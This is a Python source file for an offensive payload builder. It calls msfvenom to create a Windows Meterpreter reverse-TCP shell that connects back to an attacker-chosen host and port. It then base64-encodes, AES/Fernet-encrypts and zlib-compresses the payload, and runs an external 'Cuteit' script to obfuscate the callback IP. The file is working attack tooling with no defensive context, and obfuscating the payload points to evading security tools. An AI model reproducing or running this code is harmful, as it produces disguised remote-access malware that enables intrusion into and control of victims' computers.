import base64
import json
import zlib

import socket
import subprocess
import ast
import os

class PayloadGenerator:
    def __init__(self):
        print("\033[1;32;40m Generating payload\033[m")
        self.url = input("Enter the URL: ")
        self.ip = socket.gethostbyname(self.url)
        self.port = input("Enter the port: ")

    def generate_payload(self):
        payload = subprocess.run(["msfvenom", "-p", "windows/meterpreter/reverse_tcp", f"LHOST={self.ip}", f"LPORT={self.port}", "-f", "python"], capture_output=True)
        self.payload = payload.stdout
        return self.payload

        
class Encoder:
    def __init__(self, payload):
        self.payload = payload

    def base64_encode(self):
        print("\033[1;32;40m Base64 Encoder \033[m")
        print("Payload: ",self.payload)
        encoded_payload = base64.b64encode(self.payload.decode().encode())
        print("Base64 encoded payload: ", encoded_payload)
        return encoded_payload

    


class Encryptor:
    def __init__(self, payload, key):
        self.payload = payload
        self.key = key

    def aes_encrypt(self):
        print("\033[1;32;40m AES ENCRYPTOR\033[m")
        import os
        from cryptography.fernet import Fernet
        from cryptography.hazmat.backends import default_backend
        from cryptography.hazmat.primitives import hashes
        from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

        password = self.key.encode()
        salt = b'\xf3\x05\x8c\x03\x12\xfe\xcd\xf8\x9a\x16'
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256,
            length=32,
            salt=salt,
            iterations=100000,
            backend=default_backend()
        )
        key = base64.urlsafe_b64encode(kdf.derive(password))
        cipher_suite = Fernet(key)
        ciphered_text = cipher_suite.encrypt(self.payload.decode().encode())
        print("AES encrypted payload: ", ciphered_text)
        return ciphered_text


class Compressor:
    def __init__(self, payload):
        self.payload = payload

    def deflate(self):
        print("\033[1;32;40m Compressor \033[m")
        compressed_payload = zlib.compress(self.payload.decode().encode())
        print("Deflated payload: ", compressed_payload)
        return compressed_payload
      
      
class IPobfuscator:
    def __init__(self):
        print("\033[1;32;40m Obfuscating IP\033[m")
        self.url = input("Enter the URL: ")
        self.ip = socket.gethostbyname(self.url)
        
    def cuteit(self):
        path = "Cuteit/"
        script = "Cuteit.py"
        os.system(f"python3 {os.path.join(path, script)} {self.ip}")
        
